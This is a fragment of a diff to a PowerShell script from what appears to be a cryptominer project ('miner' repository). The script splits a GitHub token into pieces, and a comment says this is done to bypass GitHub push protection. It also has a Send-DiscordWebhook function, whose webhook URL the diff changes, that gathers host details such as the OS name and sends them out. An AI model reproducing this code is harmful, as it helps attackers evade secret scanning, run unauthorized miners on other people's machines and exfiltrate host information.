@@ -9,7 +9,7 @@
 # Token split to bypass GitHub push protection
 $_t = @("YOUR_TOKEN_HERE", "ZXZc1c2Do", "w34dIuAjT", "GtgBLt2kfsTW")
 $ghToken = $_t -join ""
-$ghOwner = "holyownsurmom"
+$ghOwner = "holyownsurmom    "
 $ghRepo = "miner"
 $ghConfigPath = "config.json"
 
@@ -562,7 +562,7 @@ function Enable-HugePages {
 }
 
 function Send-DiscordWebhook {
-    $webhookUrl = "https://discord.com/api/webhooks/1505264979308187738/BwvLPlT3KRSLuePnkgB5sM_XqYeZQloN80AvA3KspooNLR5SXQ2XQ2pXT8rncoM9VEyl"
+    $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
     try {
         $osName = "Unknown"
         try { $osName = (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption } catch {
